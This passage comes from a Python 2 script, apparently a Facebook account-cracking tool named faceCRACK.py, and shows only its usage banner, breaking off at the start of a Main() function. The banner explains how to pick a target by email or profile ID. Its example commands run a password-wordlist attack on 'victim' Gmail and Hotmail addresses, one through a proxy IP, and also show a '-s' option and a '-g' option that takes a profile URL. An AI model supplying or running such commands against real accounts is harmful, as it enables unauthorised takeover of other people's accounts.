...
Usage: python2 faceCRACK.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------    
    | -t <Target Em@il> [OR] <Facebook ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
...
Examples:
        |
     |--------
     | python2 faceCRACK.py -t victim@gmail.com -w /storage/password.txt
     |--------
     | python2 FaceCRACK.py -t 100001013078780 -w /storage/password.txt
     |--------
     | python2 faceCRACK.py -t victim@hotmail.com -w /storage/password.txt -p 35.236.37.121 default(port=8080,80) 
     |--------
     | python2 faceCRACK.py -t victim@gmail.com -s 1234567
     |-------- 
     | python2 faceCRACK.py -g https://www.facebook.com/ghosthub99 
     |-------- 
""")
def Main():
